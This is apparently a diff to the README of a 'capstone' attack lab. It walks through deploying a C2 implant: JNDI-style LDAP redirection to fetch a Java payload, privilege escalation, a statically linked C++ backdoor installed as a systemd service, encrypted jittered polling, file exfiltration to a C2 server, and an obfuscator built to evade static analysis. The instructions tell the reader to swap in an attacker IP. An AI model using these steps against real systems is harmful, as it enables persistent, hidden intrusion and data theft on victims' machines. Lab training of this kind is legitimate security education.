@@ -37,12 +37,15 @@ sequenceDiagram
     Root-->>Server: Spawns root execution context
     Server->>Root: 7. Write & Start systemd-cache.service
     Note over Root,C2: Persistence Established
-    Root->>C2: 8. POST /checkin (Hostname)
-    loop Every 5 seconds
+    Root->>C2: 8. POST /checkin (Encrypted Hostname)
+    loop Every 5-20 seconds (Jittered)
         Root->>C2: 9. GET /command
-        C2-->>Root: {"command": "recon"}
+        C2-->>Root: Encrypted Command
         Note right of Root: Executes locally
-        Root->>C2: POST /result (Output)
+        Root->>C2: POST /result (Encrypted Output)
+        opt If Exfil Command
+            Root->>C2: POST /exfil (Encrypted Base64 File)
+        end
     end
 ```
 
@@ -221,14 +224,14 @@ Compile it targeting Java 17 bytecode (use the obfuscated filename if you chose 
 ```
 
 **[NEW] Compile the C++ Persistence Backdoor**
-You must compile the `Persistent.cpp` source code into an ELF binary before deploying. It is crucial to statically link it so it runs properly on the victim machine regardless of system libraries:
+You must compile the `Persistent.cpp` source code into an ELF binary before deploying. It is crucial to statically link it and include the OpenSSL libraries so it runs properly on the victim machine regardless of system libraries:
 
 ```
 # NOTE: Update the 127.0.0.1 IP inside Persistent.cpp and Beachhead.java 
 # to your ATTACKER machine's IP if you are testing across a network!
-g++ -std=c++17 -static Persistent.cpp -o Persistent.elf
+g++ -std=c++17 -static Persistent.cpp -o Persistent.elf -lssl -lcrypto
 ```
-*(Alternatively, you can compile the obfuscated variant `PersistentObfuscated.cpp` if provided in your repository, which obfuscates API strings and polling loops).*
+*(Alternatively, you can run `python3 obfuscator.py` to generate and compile the obfuscated variant `PersistentObfuscated.cpp`, which encrypts strings via XOR, renames identifiers, and injects opaque predicates to evade static analysis).*
 
 Confirm the compiled files exist:
 
@@ -308,13 +311,15 @@ Send LDAP reference result for Beachhead redirecting to http://127.0.0.1:8888/Be
 127.0.0.1 - - [date] "GET /Persistent.elf HTTP/1.1" 200 -
 ```
 
-Then confirm the privilege escalation and payload execution was successful in your C2 Server terminal (Terminal 5):
+Then confirm the privilege escalation and payload execution was successful. You can view the raw terminal output:
 
 ```
 docker logs -f capstone-c2-server-draft
 ```
 
-You should see an incoming `[+] Check-in received` object containing your victim machine's hostname, followed by a `[+] Result received` block containing full automated recon data! Your reverse shell backdoor is now permanently installed via systemd and polling for future commands every 5 seconds.
+**Or open a web browser and navigate to `http://127.0.0.1:5000/`** to view the live C2 dashboard, queue commands, and view exfiltrated data!
+
+You should see an incoming `[+] Check-in received` containing your victim machine's hostname, followed by a `[+] Result received` block containing full automated recon data. Your reverse shell backdoor is now permanently installed via systemd, communicating via native C++ sockets over AES-128-CBC encrypted payloads, and polling for future commands.
 
 ---
 
